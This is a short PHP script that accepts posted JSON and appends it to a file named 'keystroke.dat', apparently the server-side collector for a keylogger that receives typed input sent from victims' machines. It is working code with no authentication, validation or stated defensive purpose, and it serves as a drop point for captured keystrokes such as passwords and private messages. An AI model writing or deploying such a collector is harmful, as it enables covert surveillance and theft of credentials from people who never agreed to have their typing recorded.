<?php

header('Content-Type: application/json');

$myFile = fopen("keystroke.dat","a") or die("Failed to open file");
$response = "";

# Get JSON as a string
$json_str = file_get_contents('php://input');

# Get as an object
$json_obj = json_decode($json_str);

if(strlen($json_str) > 0)
	$response="success";
else
	$response="faulure";

fwrite($myFile, $json_str);
fclose($myFile);
echo json_encode($response);

?>